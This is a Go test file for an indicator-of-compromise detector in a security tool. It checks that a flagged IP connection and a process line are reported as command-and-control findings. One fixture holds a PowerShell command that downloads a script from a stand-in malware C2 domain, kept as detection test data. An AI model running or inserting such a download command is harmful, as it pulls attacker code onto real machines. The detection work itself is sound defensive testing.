package detect

import (
	"testing"

	"github.com/FlinnZee/breachhound/internal/core"
)

func TestIOCMatchesBadIP(t *testing.T) {
	ctx := core.NewContext(core.Config{})
	ctx.Host.Connections = []core.Connection{
		{Proto: "tcp", RemoteAddr: "198.51.100.13", RemotePort: 443, PID: 10, ProcessName: "svchost"},
		{Proto: "tcp", RemoteAddr: "8.8.8.8", RemotePort: 53, PID: 11, ProcessName: "dns"},
	}
	fs, err := ioc{}.Detect(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if len(fs) != 1 {
		t.Fatalf("got %d findings, want 1", len(fs))
	}
	if fs[0].Severity != core.SevCritical || fs[0].Tactic != "Command and Control" {
		t.Errorf("unexpected finding shape: %+v", fs[0])
	}
}

func TestIOCMatchesBadDomain(t *testing.T) {
	ctx := core.NewContext(core.Config{})
	ctx.Host.Processes = []core.Process{
		{PID: 20, Name: "powershell.exe", CmdLine: "iwr http://malware-c2.example/x.ps1"},
	}
	fs, _ := ioc{}.Detect(ctx)
	if len(fs) != 1 {
		t.Fatalf("got %d findings, want 1", len(fs))
	}
}
